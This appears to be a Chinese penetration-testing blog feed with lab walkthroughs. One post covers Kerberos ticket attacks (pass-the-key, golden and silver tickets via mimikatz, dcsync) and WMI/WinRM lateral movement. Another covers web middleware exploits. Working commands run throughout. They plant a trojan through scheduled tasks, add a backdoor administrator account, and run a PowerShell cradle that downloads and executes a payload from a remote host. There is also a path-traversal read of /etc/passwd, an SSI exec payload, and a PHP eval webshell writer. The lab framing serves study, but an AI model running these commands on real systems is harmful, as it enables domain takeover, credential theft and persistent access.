CS</h4><p>PTK 本质上也是一种认证，本身不具有攻击性，如果知道一些特殊账号的 KEY 就可以利用 PTK 传递攻击，我们可以 getTGT 工具生成对应账号的 TGT 票据(后缀是ccache)，然后将票据导入到内存中，取得对目标机器的访问权。后续可以使用计划任务、服务等上线 CS。</p><p>这之前的环境准备，由于未知原因mimikatz的命令无法读取到Adminitrator的AESKEY，所有这里选择在域控新建了一个testuser1用户作为管理员权限用户</p><ol><li><p>最开始的时候确认票据<br><img src="https://i.imgur.com/cGHlcGa.png"></p></li><li><p>使用 <code>mimikatz “privilege::debug” “sekurlsa::ekeys”</code> 读取 AES key。<br><img src="https://i.imgur.com/qPbxbvK.png" alt="1000"><br><img src="https://i.imgur.com/jq4MfPd.png" alt="1000"></p></li><li><p>生成 TGT 票据:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getTGT.exe kea.com/testuser1 -aesKey 3f7d53bb696c889aabf38ead93a4c002efc3e088bbb94e6b9207f0c0cc800519</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/0qwDQVc.png" alt="800"></p></li><li><p>导入内存:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc testuser1.ccache&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/cMPZJKm.png" alt="800"></p></li><li><p>查看是否导入成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe kerberos::list</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/XsAxPu2.png" alt="800"></p></li></ol><p>查看票据列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/z0MrGwR.png" alt="800"></p><p>而且可以正常访问其他用户<br><img src="https://i.imgur.com/qleMPyM.png" alt="800"></p><ol start="6"><li>传递木马,创建并执行计划任务<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">copy artifact2.exe \\192.168.255.10\c$\ptk.exe</span><br><span class="line"></span><br><span class="line">schtasks /create /s 192.168.255.10 /tr c:\ptk.exe /tn ptktest /sc onstart /ru system /f</span><br><span class="line"></span><br><span class="line">schtasks /run /s 192.168.255.10 /tn ptktest /i</span><br></pre></td></tr></table></figure><img src="https://i.imgur.com/uWBi7n3.png"><br>成功上线<br><img src="https://i.imgur.com/yDXynMu.png"></li></ol><blockquote><p>[!NOTE] 删除计划任务<br><code>shell schtasks /delete /s 192.168.255.10 /u administrator /p Win.2024 /tn ptktest /f</code></p></blockquote><ol start="7"><li>清除票据:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::purge</span><br></pre></td></tr></table></figure><img src="https://i.imgur.com/yIFnec2.png"></li></ol><h3 id="PTT-PTC"><a href="#PTT-PTC" class="headerlink" title="PTT&amp;PTC"></a>PTT&amp;PTC</h3><p>PTK(Pass The Ticket)中文叫票据传递攻击，PTT 攻击只能用于 kerberos 认证中，NTLM 认证中没有。PTT 是通过票据进行认证的，回顾 kerberos 认证的流程便可理解，不再赘述。进行票据传递，不需要提权。</p><p>获取 TGT 和 ST 的方式:<br>• 域账号明文密码<br>• 域账号的 NTLM-HASH<br>• 域账号的 Aes key<br>• 直接伪造<br>• 系统漏洞<br>• 系统遗留票据</p><p>使用明文生成票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getTGT.exe gouzi.com/dadmin:123456</span><br><span class="line"></span><br><span class="line">getTGT.exe gouzi.com/dadmin -hashes LM-HASH:NTLM-HASH</span><br></pre></td></tr></table></figure><p>利用条件<br>1、域内环境<br>2、能够获取相应的票据(主要针对域管理员)</p><p>Ccahe 和 Kirbi 票据：不同的工具获取的票据后缀不一样，常见的有 Ccache 和 Kirbi。</p><ul><li>getTGT 工具生成的是 Ccache 票据</li><li>kekeo 工具生成的是 Kirbi 票据。<br>但是本质上都可以作为 TGT 票据，且可以互相转换</li></ul><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>原理忘了就回顾一下 kerberos，我们之前学的 PTK、PTT 攻击都是通过正常的认证流程使得 KDC 返回一张合法票据，但是前提就是必须要拥有高权限用户的 hash值或者 aes key。</p><p>假设我们已经控制了 DC，能够通过各种手段获取 krbtgt 用户的 hash 值，就能不依靠 KDC 凭空生成一张黄金票据，这种做法比较隐蔽且不好溯源。所以一般用来作为内网权限维持（黄金票据可以在工作组环境下使用）的一种常用手段。</p><p>利用条件<br>• krbtgt 用户的 hash 值<br>• 域名<br>• 域的 SID 值<br>• 伪造用户</p><p>域的 sid 值使用任意域用户执行 whoami &#x2F;all 即可得出:<br><img src="https://i.imgur.com/mzvyOwG.png"></p><ul><li>去此处得SID用于后续实验：S-1-5-21-880678290-82948828-1398698765-500</li></ul><p>1、使用 mimikatz制作黄金票据并且注入内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:administrartor /domain:kea.com /sid:S-1-5-21-880678290-82948828-1398698765-500 /krbtgt:a2b1adb8df28b28ea2472b73b960c967 /ptt</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/wGOZOli.png"></p><ul><li>此处的sid取的域用户机Win-1</li><li>次数krbtgt请在域控机器上运行hashdump自行获取<br>jump上线<br><img src="https://i.imgur.com/OwgaSmk.png"><br><img src="https://i.imgur.com/SjVV8TI.png"></li></ul><p>2、使用 impacket-ticketer:生成.ccache 票据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ticketer.exe -domain-sid &quot;sid&quot; -nthash &quot;NTLMHASH&quot; -domain &quot;domain&quot; &quot;username&quot;</span><br><span class="line"></span><br><span class="line">ticketer.exe -domain-sid S-1-5-21-880678290-82948828-1398698765-500 -nthash a2b1adb8df28b28ea2472b73b960c967 -domain kea.com administrator</span><br><span class="line"></span><br><span class="line">mimikatz.exe kerberos::ptc administrator.ccache</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/M3M1B57.png"></p><p>3、MSF kiwi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d gouzi.com -k 0e5c40110da014eaf2fe8d862194af7f -s S-1-5-21-4192929989-692860420-895873630 -u administrator -t /tmp/administrator.ticket</span><br></pre></td></tr></table></figure><blockquote><p>[!NOTE]<br>上线过程不再演示，唯一要注意的是如果需要利用工作组机器使用黄金票据访问 dc,如果当前机器不能通过域名直接访问机器，就需要修改 host文件或者 dns 配置。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo 192.168.197.10 dc.gouzi.com &gt;&gt; C:</span><br><span class="line"></span><br><span class="line">netsh interface ipv4 add dns 本地连接 192.168.197.10</span><br></pre></td></tr></table></figure><p>这里的本地连接是网卡名字，可以使用 systeminfo 看见，中文机器常使用”本地连接”</p></blockquote><p>域外机器尝试上线: </p><ol><li>使用ticketer.exe离线生成.ccache票据<br><img src="https://i.imgur.com/zAyljql.png"></li></ol><ul><li>sid取先前域用户的</li><li>hash先前krbtgt</li></ul><ol start="2"><li><p>将生成的票据塞进域外的机器,使用mimikatz.exe的命令来将票价凭证注入内存<br><img src="https://i.imgur.com/IVOUGmC.png"><br>验证是否成功导入票据<br><img src="https://i.imgur.com/4F98t7g.png"></p></li><li><p>将该机器的dns改为目标机器的域名192.168.255.10<br><img src="https://i.imgur.com/hucCXGT.png"></p></li><li><p>使用jump命令上线<br><img src="https://i.imgur.com/nb8mHnk.png"><br><img src="https://i.imgur.com/stu6e54.png"></p></li></ol><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据就是伪造 ST 票据，在整个 kerberos 协议认证过程中，跳过了 TGS 的认证。</p><p>一般伪造 ST 票据中的服务都是系统自带的服务，比如 CIFS、HOST 服务，方便后续横向移动。</p><p>前提条件</p><ul><li>域名&amp;域 SID</li><li>服务端全域名</li><li>服务端可利用的 SPN</li><li>服务端 SPN 注册用户的 hash 值(一般选择机器用户 hash)</li><li>需要伪造的用户名</li></ul><p>机器用户 hash 值的获取方式：</p><ul><li>mimikatz-域管理员 dcsync</li><li>secretsdump-域管理员读取密码</li></ul><p>票据制作</p><p>白银票据也是一种权限维持的方式，所以我们伪造的服务目的一般是为了方便横向移动。需要根据不同的控制手段来选择不同的服务。</p><table><thead><tr><th>命令</th><th>需要的服务</th></tr></thead><tbody><tr><td>copy|dir|psexec cifs</td><td>cifs</td></tr><tr><td>计划任务&#x2F;服务</td><td>host</td></tr><tr><td>dcsync</td><td>cifs、ldap</td></tr><tr><td>winrs</td><td>http</td></tr><tr><td>wmi</td><td>RestrictedKrbHost、host、RPCSS</td></tr></tbody></table><h4 id="实验-使用-mimikatz-制作白银票据："><a href="#实验-使用-mimikatz-制作白银票据：" class="headerlink" title="实验-使用 mimikatz 制作白银票据："></a>实验-使用 mimikatz 制作白银票据：</h4><p>为了避免特权用户的影响，所以这里选用一个域成员机器来实验:<br><img src="https://i.imgur.com/mww7HKX.png"></p><ol><li>生成cifs服务白银票据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /domain:kea.com /sid:S-1-5-21-697776903-4083723091-3295495450 /target:WIN-DBNULB576SJ.kea.com /service:cifs /rc4:79b2d38d45d8909a4a27108d9f71935b /user:dadmin /ptt</span><br></pre></td></tr></table></figure><img src="https://i.imgur.com/1Q7k4Ob.png"></li></ol><ul><li>sid采用机器用户域控管理员用户的sid</li><li>hash采用域控用户中机器用户WIN-DBNULB576SJ的hash</li><li>服务选定为cifs文件服务<br>确认票据成功生成<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure><img src="https://i.imgur.com/S5vE3dr.png"></li></ul><ol start="2"><li>确认服务成功生效<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\WIN-DBNULB576SJ.kea.com\c$</span><br></pre></td></tr></table></figure><img src="https://i.imgur.com/xbHE2An.png"></li></ol><h4 id="实验-伪造-ldap-服务上线-dc："><a href="#实验-伪造-ldap-服务上线-dc：" class="headerlink" title="实验-伪造 ldap 服务上线 dc："></a>实验-伪造 ldap 服务上线 dc：</h4><blockquote><p>对当前 shell 环境没有要求<br>如果当前机器不在域，需要修改 DNS</p></blockquote><p>先确认环境能否正常使用dcsync服务<br><img src="https://i.imgur.com/r64yjaJ.png"></p><p>制作 ldap 票据和 cifs 票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /domain:gouzi.com /sidS-1-5-21-697776903-4083723091-3295495450 /target:dc.gouzi.com /service:ldap /rc4:da1ac177f6e26a201455def0ae82fc2b /user:dadmin /ptt</span><br><span class="line"></span><br><span class="line">mimikatz kerberos::golden /domain:gouzi.com /sid:S-1-5-21-697776903-4083723091-3295495450 /target:dc.gouzi.com /service:cifs /rc4:da1ac177f6e26a201455def0ae82fc2b /user:dadmin /ptt</span><br></pre></td></tr></table></figure><p>这里添加ldap票据<br><img src="https://i.imgur.com/1RexTCM.png"></p><p>dcsync 查询 hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /all /csv</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/I5n52So.png"></p><p>利用 krbtgt 用户制作金票<br>CS 自带黄金票据制作功能，填入域的 sid 和 krbtgt 用户的 hash 值，选择一个用户制作即可（一般是域管或者 administrator）</p><p>psexec 横向移动:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec dc.gouzi.com</span><br></pre></td></tr></table></figure><p>WMI（Windows Management Instrumentation，Windows 管理规范）是 Windows操作系统中内置的系统工具框架，它是 Windows 2000&#x2F;XP 及更高版本管理系统的核心组件，属于管理数据和操作的基础模块。</p><p>WMI 旨在实现本地或远程的系统、应用程序等资源的管理、配置、监视。它使用WQL 查询语言进行数据查询，并可通过 PowerShell、WMIC 和 WBEMTEST 等工具进行交互。WMI 支持 DCOM 和 WinRM 协议，允许网络管理员监视设备、访问重要信息，并在故障排查、安全审计等方面发挥重要作用。在使用 wmiexec 进行横向移动时，不会在系统中留下操作日志，可以在一定程度上规避安全设备(wmic 走的是 rpc 协议)。</p><blockquote><p>WMIC（Windows Management Instrumentation Command-line）是 WMI的一个命令行工具，用于与 WMI 进行交互。是一个比 Windows CMD 更加强大的命令集。</p></blockquote><p><strong>wmic 常用命令如下:</strong></p><p>当前登录用户:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic logon list brief</span><br></pre></td></tr></table></figure><p>用户列表:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic list brief</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>启动项:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup list brief</span><br></pre></td></tr></table></figure><p>安装软件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><p>补丁情况:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list brief</span><br></pre></td></tr></table></figure><p>是否虚拟机:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic bios list full |findstr /i &quot;vmware&quot;</span><br></pre></td></tr></table></figure><p>获取指定程序的路径和启动命令行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;cmd.exe&quot; get ExecutablePath,CommandLine</span><br></pre></td></tr></table></figure><p>连接远程电脑(高权限用户):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:&quot;ip&quot; /user:user /password:pass</span><br></pre></td></tr></table></figure><p>创建进程:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process call create</span><br><span class="line">wmic process call create &quot;C:\Windows\System32\notepad.exe&quot;</span><br></pre></td></tr></table></figure><p>关闭进程:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;进程名称&quot; call terminate</span><br><span class="line">wmic process where name=&quot;notepad.exe&quot; call terminate</span><br></pre></td></tr></table></figure><p>可以使用 WMIC 命令集的强大管理功能和支持远程执行命令的特点，做一些操作，比如：</p><p>远程添加管理:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.197.30 /user:administrator /password:aqa@123 process call create &quot;cmd.exe /c net user jack hack@123 /add &amp;&amp; net localgroup administrators jack /add&quot;</span><br></pre></td></tr></table></figure><p>远程执行 powershell 上线(网络畅通):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.197.30 /user:administrator /password:aqa@123 process call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX((new-object net.webclient).downloadstring(&#x27;http://192.168.31.212/payload_x64.ps1&#x27;))\&quot;&quot;</span><br></pre></td></tr></table></figure><p>利用条件</p><ul><li>shell 环境:普通管理员或者域管理员。</li><li>目标环境:获取本地 administrator 密码，或者已经取得域管理员以上权限账号的用户密码，或者已经和目标主机建立信任关系。</li><li>端口:445 和 135。</li></ul><p>实验内容-使用powershell命令CS 上线</p><p>在先前已经完成票据实验的前提下</p><ol><li><p>生成powershell的木马执行文件<br><img src="https://i.imgur.com/FzPPVJJ.gif"></p></li><li><p>命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.255.10 /user:Administrator /password:Win.2024 process call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX((new-object net.webclient).downloadstring(&#x27;http://192.168.255.1:8000/payload.ps1&#x27;))\&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/9RvGyWF.png" alt="1100"></p></li></ol><ul><li>通过WMIC工具，在远程计算机 <code>192.168.197.30</code> 上以管理员权限执行一条PowerShell命令。</li><li>PowerShell命令从服务器 <code>http://192.168.31.212</code> 下载并执行名为 <code>payload.ps1</code> 的脚本。</li></ul><p>成功上线<br><img src="https://i.imgur.com/lqVR7B4.png"></p><h2 id="WinRM（CS-不回显）"><a href="#WinRM（CS-不回显）" class="headerlink" title="WinRM（CS 不回显）"></a>WinRM（CS 不回显）</h2><p>WinRM（Windows 远程管理）是 Microsoft 实现的 WS-Management 协议，基于SOAP 的防火墙友好协议，用于系统管理和信息交换。它允许 IT 专业人员和开发人员远程管理 Windows 服务器，获取管理数据，执行自动化脚本。</p><p>WinRM 默认使用 5985 端口（HTTP）和 5986 端口（HTTPS）进行通信，需要配置WinRM 侦听器和 TrustedHosts 才能从远程计算机获取数据。</p><p>WinRM 服务在 Windows Server2008 R2 之后默认开启，家庭版的 Windows 默认关闭。</p><p>&#x3D;&#x3D;该服务的好处是远程连接是客户端无感，不占用连接数。一定程度上规避安全设备。支持不同类型的身份认证，如 NTLM 和 Kerberos 协议。(通过 PTH PTK PTT认证之后不需要再输入账号密码认证)&#x3D;&#x3D;powershell 中使用 enable-psremoting 命令开启服务，如果服务已开启，会出现如下提示（实际环境中一般依靠端口 5985 和 5986 来判断服务是否开启。）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-PSRemoting</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/1XiNNAP.png"></p><p>基本使用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.255.10:5985 -u:administrator -p:Win.2024 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><blockquote><p>[!NOTE]<br>如果出现 WinRM 客户端无法处理该请求，使用 administrator 用户执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line"></span><br><span class="line">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure><p>或者修改注册表:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>中间件</title>
      <link href="/2024/12/22/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
      <url>/2024/12/22/%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>一些中间件的漏洞尝试</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h1 id="Apache中间件"><a href="#Apache中间件" class="headerlink" title="Apache中间件"></a>Apache中间件</h1><p>apache目录结构:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bin：存放常用命令工具，如httpd </span><br><span class="line">cgi-bin：存放linux下常用命令，如xxx.sh error：错误记录 </span><br><span class="line">htdocs：网站源码 </span><br><span class="line">icons：网站图标 </span><br><span class="line">manual：手册 </span><br><span class="line">modules：扩展模块</span><br></pre></td></tr></table></figure><h3 id="ApacheHTTPD换行解析漏洞（CVE-2017-15715"><a href="#ApacheHTTPD换行解析漏洞（CVE-2017-15715" class="headerlink" title="ApacheHTTPD换行解析漏洞（CVE-2017-15715)"></a>ApacheHTTPD换行解析漏洞（CVE-2017-15715)</h3><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。</p><p>其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0a</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>可以看到这里获取文件名是需要单独<code>$post[&#39;name&#39;]</code>的，因为如果通过<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>获取文件名的话，会把<code>\x0a</code>自动去除，所以<code>$_FILE[&#39;file&#39;][&#39;name&#39;]</code>这种方式获取文件名就不会造成这个漏洞</p><p>影响范围：Apache 2.4.0~2.4.29</p><p>到指定目录打开docker镜像环境<br><img src="https://i.imgur.com/WXaTLpJ.gif"></p><p>等待下载完成后网页访问<br><img src="https://i.imgur.com/NOI5AzX.gif"></p><p>选择文件<br><img src="https://i.imgur.com/r4J46KJ.gif"></p><p>抓包改包，把1.php修改成1.phpa,这里从显示bad file到成功上传<br><img src="https://i.imgur.com/FAepT9T.gif"></p><p>尝试访问，确认成功上传，只不过没有被解析<br><img src="https://i.imgur.com/HFXnSMs.gif"></p><p>修改hex值，将a对应的部分修改成0a,这里是换行符的意思<br><img src="https://i.imgur.com/B2JFg5b.gif"></p><p>成功访问并解析<br><img src="https://i.imgur.com/XRxusrD.gif"></p><h3 id="Apache-HTTP-Server-2-4-49-路径穿越漏洞（CVE-2021-41773）"><a href="#Apache-HTTP-Server-2-4-49-路径穿越漏洞（CVE-2021-41773）" class="headerlink" title="Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）"></a>Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</h3><p>Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</p><p>影响范围：Apache 2.4.49~2.4.50</p><p>抓包改包，插入payload:<code>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code><br><img src="https://i.imgur.com/wANErvN.gif"></p><p>注意，直接输入url是无法正常访问到的<br><img src="https://i.imgur.com/W9dGK05.gif"></p><h3 id="Apache-HTTP-Server-2-4-50-路径穿越漏洞（CVE-2021-42013）"><a href="#Apache-HTTP-Server-2-4-50-路径穿越漏洞（CVE-2021-42013）" class="headerlink" title="Apache HTTP Server 2.4.50 路径穿越漏洞（CVE-2021-42013）"></a>Apache HTTP Server 2.4.50 路径穿越漏洞（CVE-2021-42013）</h3><p>CVE-2021-42013 是由 CVE-2021-41773 修复不完整所致的漏洞，攻击者可能使用路<br>径遍历攻击将 URL 映射到类似别名指令配置的目录之外的文件。</p><p><img src="https://i.imgur.com/Gg0xxmQ.png"></p><h3 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h3><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传 php 后缀的文件，当目<br>标服务器开启了 SSI 与 CGI 支持，我们就可以上传 shtml，利用<!--#exec cmd="ls /" --><br>语法来执行命令。<br>使用 SSI(Server Side Include)的 html 文件扩展名，SSI（Server Side Include)，通常称为<br>“服务器端嵌入”或者叫”服务器端包含”，是一种类似于 ASP 的基于服务器的网页制作<br>技术。默认扩展</p><p>构造poc<br>新建文本文档，输入<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>，保存后修改后缀为shtml<br><img src="https://i.imgur.com/g2nxpG5.png"></p><p>上传poc<br><img src="https://i.imgur.com/YLGARbV.gif"></p><h1 id="Tomcat-中间件"><a href="#Tomcat-中间件" class="headerlink" title="Tomcat 中间件"></a>Tomcat 中间件</h1><h3 id="Tomcat-弱密码-后端-Getshell-漏洞"><a href="#Tomcat-弱密码-后端-Getshell-漏洞" class="headerlink" title="Tomcat 弱密码 &amp;&amp; 后端 Getshell 漏洞"></a>Tomcat 弱密码 &amp;&amp; 后端 Getshell 漏洞</h3><p>账户密码都是tomcat,访问<br><img src="https://i.imgur.com/9EFLRg2.gif"></p><p>制作poc</p><ul><li>生成jsp木马文件<br><img src="https://i.imgur.com/TIqN1Ip.gif"></li><li>重命名为shell.php，压缩成<code>.zip</code>文件，重命名为<code>.war</code>文件<br><img src="https://i.imgur.com/QFrmJdF.gif"></li></ul><p>上传poc文件<br><img src="https://i.imgur.com/QLdlNvY.gif"></p><p>使用中国蚁剑进行连接<br><img src="https://i.imgur.com/9HGUX0F.gif"></p><h1 id="Nginx-中间件"><a href="#Nginx-中间件" class="headerlink" title="Nginx 中间件"></a>Nginx 中间件</h1><h3 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h3><p>构造poc</p><p>前面加上GIF98A作为图片格式的标识，后面加入php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cmd.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;])?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 使用 file_put_contents 函数创建或覆盖一个名为 ‘cmd.php’ 的文件。<br>&#x2F;&#x2F; 文件内容是一个一句话木马：<code>&lt;?php eval($_POST[&quot;cmd&quot;])?&gt;</code></p><p><img src="https://i.imgur.com/Xl2zyz5.png"></p><p>提前开启拦截，然后提交构造好的poc，bp拦截到包<br><img src="https://i.imgur.com/Rj9H5wU.gif"></p><p>文件名的后缀添加一个空格，然后关闭拦截<br><img src="https://i.imgur.com/PNdSYas.gif"></p><p>修改url再刷新发送请求<br><img src="https://i.imgur.com/guAMRbo.gif"></p><p>抓包进行修改，然后发包，显示了GIF98A，说明成功访问到了文件</p><ul><li>将%20替换为空格</li><li>将hex中a的61替换成00<br><img src="https://i.imgur.com/UbdriTT.gif"></li></ul><p>访问cmd.php，成功访问到，说明成功解析了<br><img src="https://i.imgur.com/nSzFucT.gif"></p><p>连接到木马<br><img src="https://i.imgur.com/QRFXNjz.gif"></p><h3 id="Nginx-解析漏洞（nginx-parsing-vulnerability）"><a href="#Nginx-解析漏洞（nginx-parsing-vulnerability）" class="headerlink" title="Nginx 解析漏洞（nginx_parsing_vulnerability）"></a>Nginx 解析漏洞（nginx_parsing_vulnerability）</h3><p>命令执行，获取服务器 web 权限，1.jpg&#x2F;.php -&gt; 1.jpg 会被当成 php 格式解析<br>NGINX 解析漏洞主要是由于 NGINX 配置文件以及 PHP 配置文件的错误配置导致的。<br>这个漏洞与 NGINX、PHP 版本无关，属于用户配置不当造成的解析漏洞。具体来说，<br>由于 nginx.conf 的配置导致 nginx 把以’.php’结尾的文件交给 fastcgi 处理，对于任意<br>文件名，在后面添加&#x2F;xxx.php（xxx 为任意字符）后，即可将文件作为 php 解析。<br>当攻击者访问&#x2F;phpinfo.jpg&#x2F;abc.php 时，Nginx 将查看 URL，看到他以.php 结尾，并<br>将路径传递给 php fastcgi 处理程序，php 看到&#x2F;phpinfo.jpg&#x2F;abc.php 不存在，便删除去最<br>后的&#x2F;abc.php，看到 phpinfo.jpg 存在，而后以 php 的形式执行.jpg 的内容。<br>这里涉及到 php 的有一个选择：cgi.fix_pathinfo，该配置默认为 1，开启状态，表<br>示对文件路径进行“修理”。当 php 